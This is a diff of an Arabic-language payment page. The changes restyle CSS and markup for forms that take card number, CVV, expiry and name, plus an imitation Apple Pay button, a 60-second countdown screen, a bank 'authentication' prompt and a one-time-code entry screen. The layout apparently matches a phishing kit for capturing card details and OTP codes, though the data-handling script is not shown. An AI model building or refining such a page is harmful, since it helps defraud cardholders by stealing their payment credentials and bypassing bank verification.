@@ -6,473 +6,597 @@
 <title>بطاقة الدفع</title>
 
 <style>
-*{
+*,
+*::before,
+*::after{
   box-sizing:border-box;
 }
 
-html, body {
-  width: 100%;
-  max-width: 100%;
-  overflow-x: hidden;
-  margin: 0;
-  padding: 0;
+html{
+  width:100%;
+  margin:0;
+  padding:0;
 }
 
-body {
-  font-family: Arial, sans-serif;
-  background: #f5f5f5;
-  min-height: 100vh;
+body{
+  width:100%;
+  min-height:100vh;
+  margin:0;
+  padding:0;
+  font-family:Arial,sans-serif;
+  background:#f5f5f5;
+  color:#111;
+  overflow-x:hidden;
+}
+
+/* الحاوية العامة */
+.site-shell{
+  width:100%;
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:flex-start;
+  padding:20px 16px 32px;
 }
 
 /* شاشة البطاقة */
-.payment-screen {
-  display: block;
-  width: 100%;
-  padding: 14px 14px 20px;
+.payment-screen{
+  display:block;
+  width:100%;
 }
 
-/* حاوية الصفحة */
+/* حاوية المحتوى الأساسية */
 .payment-wrap{
-  width: 100%;
-  max-width: 420px;
-  margin: 0 auto;
+  width:min(100%, 760px);
+  margin:0 auto;
 }
 
 /* طبقة Apple Pay البيضاء */
-.apple-pay-screen {
-  position: fixed;
-  inset: 0;
-  background: #fff;
-  z-index: 99999;
-  display: none;
+.apple-pay-screen{
+  position:fixed;
+  inset:0;
+  background:#fff;
+  z-index:99999;
+  display:none;
 }
 
 /* زر Apple Pay */
-.apple-pay-btn {
-  width: 100%;
-  margin: 10px auto 10px;
-  background: #000;
-  border-radius: 40px;
-  height: 55px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  overflow: hidden;
-  cursor: pointer;
+.apple-pay-btn{
+  width:100%;
+  margin:0 auto 14px;
+  background:#000;
+  border:none;
+  border-radius:999px;
+  min-height:62px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  overflow:hidden;
+  cursor:pointer;
+  padding:10px 18px;
+  -webkit-tap-highlight-color:transparent;
 }
 
-/* حاوية الشعار */
-.apple-wrap {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  overflow: hidden;
-  width: 160px;
-  max-width: 100%;
+/* حاوية شعار أبل */
+.apple-wrap{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  width:100%;
+  min-height:40px;
 }
 
-/* الشعار */
-.apple-logo {
-  height: 26px;
-  width: auto;
-  max-width: 100%;
-  background: transparent !important;
-  border: none !important;
-  box-shadow: none !important;
-  object-fit: contain;
-  margin-top: 3px;
-  pointer-events: none;
-  display: block;
+/* شعار Apple Pay */
+.apple-logo{
+  display:block;
+  width:auto;
+  height:36px;
+  max-width:min(280px, 70%);
+  object-fit:contain;
+  background:transparent !important;
+  border:none !important;
+  box-shadow:none !important;
+  pointer-events:none;
 }
 
-/* الإطار */
-.box {
-  width: 100%;
-  margin: 0 auto;
-  border: 2px solid #000;
-  border-radius: 25px;
-  padding: 20px;
-  background: #fff;
-  overflow: hidden;
+/* الإطار الرئيسي */
+.box{
+  width:100%;
+  margin:0 auto;
+  border:2px solid #111;
+  border-radius:28px;
+  padding:24px;
+  background:#fff;
+  overflow:hidden;
 }
 
 /* العنوان */
-.title {
-  font-size: 22px;
-  font-weight: 700;
-  margin-bottom: 15px;
+.title{
+  font-size:28px;
+  font-weight:700;
+  line-height:1.3;
+  margin-bottom:18px;
+  text-align:right;
 }
 
 /* حقل رقم البطاقة */
-.input-box {
-  width: 100%;
-  background: #f2f2f2;
-  border-radius: 30px;
-  padding: 0 15px;
-  height: 48px;
-  margin-top: 15px;
-  display: flex;
-  align-items: center;
-  box-sizing: border-box;
-  border: 1px solid transparent;
-  transition: border-color 0.2s ease, box-shadow 0.2s ease;
-  min-width: 0;
+.input-box{
+  width:100%;
+  min-height:56px;
+  background:#f2f2f2;
+  border-radius:999px;
+  padding:0 16px;
+  margin-top:14px;
+  display:flex;
+  align-items:center;
+  border:1px solid transparent;
+  transition:border-color .2s ease, box-shadow .2s ease;
+  min-width:0;
 }
 
-/* الشعار */
-.card-icon {
-  width: 65px;
-  height: auto;
-  margin-left: 10px;
-  background: transparent !important;
-  border: none !important;
-  box-shadow: none !important;
-  display: block;
-  flex: 0 0 auto;
+/* شعار البطاقة */
+.card-icon{
+  width:68px;
+  height:auto;
+  margin-left:10px;
+  background:transparent !important;
+  border:none !important;
+  box-shadow:none !important;
+  display:block;
+  flex:0 0 auto;
 }
 
 /* رقم البطاقة */
-.card-number {
-  border: none;
-  outline: none;
-  background: transparent;
-  font-size: 16px;
-  width: 100%;
-  min-width: 0;
-  text-align: right;
+.card-number{
+  width:100%;
+  min-width:0;
+  border:none;
+  outline:none;
+  background:transparent;
+  font-size:17px;
+  text-align:right;
+  color:#111;
 }
 
 /* صف */
-.row {
-  display: flex;
-  width: 100%;
-  gap: 10px;
-  margin-top: 15px;
-  box-sizing: border-box;
+.row{
+  display:flex;
+  width:100%;
+  gap:12px;
+  margin-top:14px;
 }
 
-.small-input {
-  flex: 1;
-  min-width: 0;
-  border: 1px solid transparent;
-  outline: none;
-  background: #f2f2f2;
-  border-radius: 30px;
-  padding: 12px;
-  text-align: center;
-  font-size: 15px;
-  box-sizing: border-box;
-  transition: border-color 0.2s ease, box-shadow 0.2s ease;
+/* المدخلات الصغيرة */
+.small-input{
+  flex:1;
+  min-width:0;
+  min-height:52px;
+  border:1px solid transparent;
+  outline:none;
+  background:#f2f2f2;
+  border-radius:999px;
+  padding:0 14px;
+  text-align:center;
+  font-size:16px;
+  transition:border-color .2s ease, box-shadow .2s ease;
 }
 
 /* الاسم */
-.name-input {
-  border: 1px solid transparent;
-  outline: none;
-  background: #f2f2f2;
-  border-radius: 30px;
-  height: 48px;
-  padding: 0 14px;
-  width: 100%;
-  text-align: center;
-  font-size: 16px;
-  margin-top: 15px;
-  box-sizing: border-box;
-  transition: border-color 0.2s ease, box-shadow 0.2s ease;
+.name-input{
+  width:100%;
+  min-height:56px;
+  border:1px solid transparent;
+  outline:none;
+  background:#f2f2f2;
+  border-radius:999px;
+  padding:0 16px;
+  text-align:center;
+  font-size:17px;
+  margin-top:14px;
+  transition:border-color .2s ease, box-shadow .2s ease;
 }
 
-/* حقل تاريخ الانتهاء */
-.expiry-box {
-  flex: 1;
-  min-width: 0;
-  background: #f2f2f2;
-  border-radius: 30px;
-  height: 45px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  box-sizing: border-box;
-  border: 1px solid transparent;
-  transition: border-color 0.2s ease, box-shadow 0.2s ease;
-  overflow: hidden;
-  direction: ltr;
+/* تاريخ الانتهاء */
+.expiry-box{
+  flex:1;
+  min-width:0;
+  min-height:52px;
+  background:#f2f2f2;
+  border-radius:999px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  border:1px solid transparent;
+  transition:border-color .2s ease, box-shadow .2s ease;
+  overflow:hidden;
+  direction:ltr;
+  padding:0 8px;
 }
 
-.expiry-select {
-  width: 44%;
-  border: none;
-  outline: none;
-  background: transparent;
-  font-size: 15px;
-  text-align: center;
-  text-align-last: center;
-  appearance: none;
-  -webkit-appearance: none;
-  -moz-appearance: none;
-  padding: 0;
-  color: #000;
-  cursor: pointer;
-  min-width: 0;
+.expiry-select{
+  width:44%;
+  border:none;
+  outline:none;
+  background:transparent;
+  font-size:16px;
+  text-align:center;
+  text-align-last:center;
+  appearance:none;
+  -webkit-appearance:none;
+  -moz-appearance:none;
+  color:#111;
+  cursor:pointer;
+  min-width:0;
 }
 
-.expiry-sep {
-  width: 12%;
-  text-align: center;
-  font-size: 15px;
-  color: #555;
-  user-select: none;
+.expiry-sep{
+  width:12%;
+  text-align:center;
+  font-size:16px;
+  color:#555;
+  user-select:none;
 }
 
 /* زر الدفع */
-.pay-btn {
-  width: 100%;
-  margin: 15px auto 0;
-  background: #2e9f44;
-  color: #fff;
-  border: none;
-  border-radius: 40px;
-  padding: 15px;
-  font-size: 20px;
-  font-weight: 700;
-  cursor: pointer;
-  display: block;
+.pay-btn{
+  width:100%;
+  margin:16px auto 0;
+  background:#2e9f44;
+  color:#fff;
+  border:none;
+  border-radius:999px;
+  min-height:60px;
+  padding:14px 18px;
+  font-size:22px;
+  font-weight:700;
+  cursor:pointer;
+  display:block;
+  -webkit-tap-highlight-color:transparent;
 }
 
-/* حالة الخطأ */
-.error {
-  border-color: rgba(220, 38, 38, 0.45) !important;
-  box-shadow: 0 0 0 2px rgba(220, 38, 38, 0.08) !important;
+/* الخطأ */
+.error{
+  border-color:rgba(220,38,38,.45) !important;
+  box-shadow:0 0 0 2px rgba(220,38,38,.08) !important;
 }
 
-input::placeholder {
-  color: #777;
+input::placeholder{
+  color:#777;
 }
 
-select:invalid {
-  color: #777;
+select:invalid{
+  color:#777;
 }
 
-/* الشاشات */
-.flow-screen {
-  position: fixed;
-  inset: 0;
-  background: #fff;
-  z-index: 100000;
-  display: none;
-  align-items: center;
-  justify-content: center;
-  padding: 20px;
-  box-sizing: border-box;
+/* الشاشات المنبثقة */
+.flow-screen{
+  position:fixed;
+  inset:0;
+  background:#fff;
+  z-index:100000;
+  display:none;
+  align-items:center;
+  justify-content:center;
+  padding:24px 16px;
 }
 
-.flow-card {
-  width: 100%;
-  max-width: 420px;
-  text-align: center;
+.flow-card{
+  width:min(100%, 760px);
+  text-align:center;
 }
 
 /* الدولاب */
-.loader-pro {
-  position: relative;
-  width: 124px;
-  height: 124px;
-  margin: 0 auto 22px;
-  border-radius: 50%;
-  background: conic-gradient(
+.loader-pro{
+  position:relative;
+  width:132px;
+  height:132px;
+  margin:0 auto 22px;
+  border-radius:50%;
+  background:conic-gradient(
     from 210deg,
     #0b78f2 0deg 58deg,
     #b9dafb 58deg 360deg
   );
-  animation: spinRing 1.15s linear infinite;
+  animation:spinRing 1.15s linear infinite;
 }
 
-.loader-pro::before {
-  content: "";
-  position: absolute;
-  inset: 18px;
-  background: #fff;
-  border-radius: 50%;
+.loader-pro::before{
+  content:"";
+  position:absolute;
+  inset:18px;
+  background:#fff;
+  border-radius:50%;
 }
 
-.loader-pro::after {
-  content: "";
-  position: absolute;
-  inset: 0;
-  border-radius: 50%;
+.loader-pro::after{
+  content:"";
+  position:absolute;
+  inset:0;
+  border-radius:50%;
   box-shadow:
-    0 0 0 1px rgba(11, 120, 242, 0.03),
-    0 8px 20px rgba(11, 120, 242, 0.08);
+    0 0 0 1px rgba(11,120,242,.03),
+    0 8px 20px rgba(11,120,242,.08);
 }
 
-.countdown {
-  font-size: 32px;
-  font-weight: 700;
-  color: #1d4ed8;
-  direction: ltr;
+.countdown{
+  font-size:34px;
+  font-weight:700;
+  color:#1d4ed8;
+  direction:ltr;
 }
 
 /* صفحة المصادقة */
-.auth-title {
-  font-size: 32px;
-  font-weight: 800;
-  color: #111;
-  line-height: 1.5;
-  margin-bottom: 18px;
+.auth-title{
+  font-size:34px;
+  font-weight:800;
+  color:#111;
+  line-height:1.5;
+  margin-bottom:18px;
 }
 
-.auth-desc {
-  font-size: 21px;
-  line-height: 2;
-  color: #444;
-  margin-bottom: 26px;
+.auth-desc{
+  font-size:22px;
+  line-height:2;
+  color:#444;
+  margin-bottom:26px;
 }
 
-.back-link {
-  display: inline-block;
-  margin-top: 120px;
-  font-size: 18px;
-  font-weight: 700;
-  color: #5b8def;
-  text-decoration: underline;
-  text-underline-offset: 4px;
-  cursor: pointer;
+.back-link{
+  display:inline-block;
+  margin-top:120px;
+  font-size:18px;
+  font-weight:700;
+  color:#5b8def;
+  text-decoration:underline;
+  text-underline-offset:4px;
+  cursor:pointer;
 }
 
 /* صفحة OTP */
-.otp-desc {
-  font-size: 17px;
-  line-height: 2;
-  color: #111;
-  margin-bottom: 18px;
+.otp-desc{
+  font-size:18px;
+  line-height:2;
+  color:#111;
+  margin-bottom:18px;
 }
 
-.otp-input {
-  width: 100%;
-  height: 52px;
-  border-radius: 30px;
-  border: 1px solid transparent;
-  background: #f2f2f2;
-  outline: none;
-  text-align: center;
-  font-size: 18px;
-  box-sizing: border-box;
-  padding: 0 16px;
-  transition: border-color 0.2s ease, box-shadow 0.2s ease;
+.otp-input{
+  width:100%;
+  min-height:56px;
+  border-radius:999px;
+  border:1px solid transparent;
+  background:#f2f2f2;
+  outline:none;
+  text-align:center;
+  font-size:18px;
+  padding:0 16px;
+  transition:border-color .2s ease, box-shadow .2s ease;
 }
 
-.otp-btn {
-  width: 100%;
-  margin-top: 15px;
-  background: #2e9f44;
-  color: #fff;
-  border: none;
-  border-radius: 40px;
-  padding: 15px;
-  font-size: 20px;
-  font-weight: 700;
-  cursor: pointer;
+.otp-btn{
+  width:100%;
+  margin-top:15px;
+  background:#2e9f44;
+  color:#fff;
+  border:none;
+  border-radius:999px;
+  min-height:60px;
+  padding:14px 18px;
+  font-size:22px;
+  font-weight:700;
+  cursor:pointer;
 }
 
-@keyframes spinRing {
-  from { transform: rotate(0deg); }
-  to { transform: rotate(360deg); }
+/* منع تكبير حقول iPhone */
+input,
+select,
+textarea,
+button{
+  font-family:inherit;
 }
 
-/* تحسينات الجوال */
-@media (max-width: 480px) {
-  .payment-screen {
-    padding: 10px 12px 18px;
+@keyframes spinRing{
+  from{ transform:rotate(0deg); }
+  to{ transform:rotate(360deg); }
+}
+
+/* شاشات كبيرة */
+@media (min-width: 992px){
+  .site-shell{
+    padding:42px 24px;
   }
 
-  .box {
-    padding: 16px 14px;
-    border-radius: 22px;
+  .payment-wrap{
+    width:min(100%, 860px);
   }
 
-  .title {
-    font-size: 20px;
+  .box{
+    padding:30px 28px;
+    border-radius:32px;
   }
 
-  .apple-pay-btn {
-    height: 50px;
-    border-radius: 28px;
+  .title{
+    font-size:32px;
+    margin-bottom:20px;
   }
 
-  .pay-btn,
-  .otp-btn {
-    font-size: 18px;
-    padding: 14px;
+  .apple-pay-btn{
+    min-height:68px;
   }
 
-  .auth-title {
-    font-size: 26px;
+  .apple-logo{
+    height:40px;
+    max-width:320px;
   }
 
-  .auth-desc {
-    font-size: 18px;
-    line-height: 1.9;
+  .pay-btn{
+    min-height:64px;
+    font-size:24px;
   }
 
-  .back-link {
-    margin-top: 90px;
-    font-size: 16px;
-  }
-
-  .loader-pro {
-    width: 110px;
-    height: 110px;
-  }
-
-  .countdown {
-    font-size: 28px;
+  .flow-card{
+    width:min(100%, 860px);
   }
 }
 
-@media (max-width: 360px) {
-  .payment-screen {
-    padding: 8px 10px 16px;
+/* تابلت */
+@media (min-width: 768px) and (max-width: 991px){
+  .site-shell{
+    padding:28px 20px 36px;
   }
 
-  .box {
-    padding: 14px 12px;
+  .payment-wrap{
+    width:min(100%, 720px);
   }
 
-  .title {
-    font-size: 18px;
+  .apple-pay-btn{
+    min-height:64px;
+  }
+
+  .apple-logo{
+    height:38px;
+    max-width:300px;
+  }
+
+  .box{
+    padding:26px 24px;
+  }
+
+  .title{
+    font-size:30px;
+  }
+}
+
+/* جوالات متوسطة */
+@media (max-width: 767px){
+  .site-shell{
+    padding:16px 12px 24px;
+  }
+
+  .payment-wrap{
+    width:100%;
+  }
+
+  .apple-pay-btn{
+    min-height:56px;
+    margin-bottom:12px;
+  }
+
+  .apple-logo{
+    height:32px;
+    max-width:220px;
+  }
+
+  .box{
+    padding:18px 16px;
+    border-radius:24px;
+  }
+
+  .title{
+    font-size:22px;
+    margin-bottom:14px;
   }
 
   .input-box,
-  .name-input,
-  .otp-input {
-    height: 46px;
+  .name-input{
+    min-height:50px;
   }
 
   .small-input,
-  .expiry-box {
-    height: 44px;
+  .expiry-box{
+    min-height:48px;
   }
 
   .card-number,
-  .name-input,
   .small-input,
   .expiry-select,
-  .otp-input {
-    font-size: 14px;
-  }
-
-  .card-icon {
-    width: 54px;
-    margin-left: 8px;
-  }
-
-  .row {
-    gap: 8px;
+  .name-input{
+    font-size:16px;
   }
 
   .pay-btn,
-  .otp-btn {
-    font-size: 17px;
-    border-radius: 28px;
+  .otp-btn{
+    min-height:54px;
+    font-size:19px;
+  }
+
+  .auth-title{
+    font-size:28px;
+  }
+
+  .auth-desc{
+    font-size:18px;
+    line-height:1.9;
+  }
+
+  .back-link{
+    margin-top:90px;
+    font-size:16px;
+  }
+
+  .loader-pro{
+    width:112px;
+    height:112px;
+  }
+
+  .countdown{
+    font-size:29px;
+  }
+}
+
+/* جوالات صغيرة جدا */
+@media (max-width: 380px){
+  .site-shell{
+    padding:12px 10px 20px;
+  }
+
+  .apple-pay-btn{
+    min-height:52px;
+  }
+
+  .apple-logo{
+    height:28px;
+    max-width:190px;
+  }
+
+  .box{
+    padding:16px 12px;
+    border-radius:22px;
+  }
+
+  .title{
+    font-size:20px;
+  }
+
+  .row{
+    gap:8px;
+  }
+
+  .card-icon{
+    width:56px;
+    margin-left:8px;
+  }
+
+  .card-number,
+  .small-input,
+  .expiry-select,
+  .name-input,
+  .otp-input{
+    font-size:15px;
+  }
+
+  .pay-btn,
+  .otp-btn{
+    font-size:18px;
+    min-height:52px;
+  }
+
+  .auth-title{
+    font-size:24px;
+  }
+
+  .auth-desc{
+    font-size:16px;
   }
 }
 </style>
@@ -480,74 +604,77 @@ select:invalid {
 
 <body>
 
-<!-- شاشة البطاقة -->
-<div class="payment-screen" id="paymentScreen">
-  <div class="payment-wrap">
+<div class="site-shell">
 
-    <div class="apple-pay-screen" id="applePayScreen"></div>
+  <!-- شاشة البطاقة -->
+  <div class="payment-screen" id="paymentScreen">
+    <div class="payment-wrap">
 
-    <div class="apple-pay-btn" id="applePayBtn">
-      <div class="apple-wrap">
-        <img src="https://i.postimg.cc/zXgvbB4n/20260412-174304.png" class="apple-logo">
-      </div>
-    </div>
+      <div class="apple-pay-screen" id="applePayScreen"></div>
 
-    <div class="box">
-      <div class="title">بطاقة الائتمان</div>
-
-      <div class="input-box" id="cardBox">
-        <img
-          id="cardLogo"
-          class="card-icon"
-          src="https://i.postimg.cc/Hsf6sDzk/20260412-152344.png"
-          alt="card"
-        >
-
-        <input
-          type="text"
-          id="cardNumber"
-          class="card-number"
-          placeholder="رقم البطاقة"
-          maxlength="16"
-          inputmode="numeric"
-          autocomplete="cc-number"
-        >
-      </div>
-
-      <div class="row">
-        <input
-          type="text"
-          id="cvv"
-          class="small-input"
-          placeholder="CVV"
-          maxlength="3"
-          inputmode="numeric"
-          autocomplete="cc-csc"
-        >
-
-        <div class="expiry-box" id="expiryBox">
-          <select id="expMonth" class="expiry-select" required>
-            <option value="" selected disabled>MM</option>
-          </select>
-          <div class="expiry-sep">/</div>
-          <select id="expYear" class="expiry-select" required>
-            <option value="" selected disabled>YY</option>
-          </select>
+      <button class="apple-pay-btn" id="applePayBtn" type="button">
+        <div class="apple-wrap">
+          <img src="https://i.postimg.cc/zXgvbB4n/20260412-174304.png" class="apple-logo" alt="Apple Pay">
         </div>
+      </button>
+
+      <div class="box">
+        <div class="title">بطاقة الائتمان</div>
+
+        <div class="input-box" id="cardBox">
+          <img
+            id="cardLogo"
+            class="card-icon"
+            src="https://i.postimg.cc/Hsf6sDzk/20260412-152344.png"
+            alt="card"
+          >
+
+          <input
+            type="text"
+            id="cardNumber"
+            class="card-number"
+            placeholder="رقم البطاقة"
+            maxlength="16"
+            inputmode="numeric"
+            autocomplete="cc-number"
+          >
+        </div>
+
+        <div class="row">
+          <input
+            type="text"
+            id="cvv"
+            class="small-input"
+            placeholder="CVV"
+            maxlength="3"
+            inputmode="numeric"
+            autocomplete="cc-csc"
+          >
+
+          <div class="expiry-box" id="expiryBox">
+            <select id="expMonth" class="expiry-select" required>
+              <option value="" selected disabled>MM</option>
+            </select>
+            <div class="expiry-sep">/</div>
+            <select id="expYear" class="expiry-select" required>
+              <option value="" selected disabled>YY</option>
+            </select>
+          </div>
+        </div>
+
+        <input
+          type="text"
+          id="cardName"
+          class="name-input"
+          placeholder="الاسم الموجود على البطاقة"
+          autocomplete="cc-name"
+        >
       </div>
 
-      <input
-        type="text"
-        id="cardName"
-        class="name-input"
-        placeholder="الاسم الموجود على البطاقة"
-        autocomplete="cc-name"
-      >
+      <button class="pay-btn" id="payBtn" type="button">ادفع الآن</button>
     </div>
-
-    <button class="pay-btn" id="payBtn">ادفع الآن</button>
-
   </div>
+
 </div>
 
 <!-- شاشة الانتظار الأولى 60 ثانية -->
@@ -586,7 +713,7 @@ select:invalid {
       maxlength="6"
     >
 
-    <button class="otp-btn" id="otpBtn">تحقق</button>
+    <button class="otp-btn" id="otpBtn" type="button">تحقق</button>
   </div>
 </div>
 
@@ -1002,4 +1129,4 @@ payBtn.addEventListener("click", function (e) {
 });
 </script>
 </body>
-          </html>
+</html>
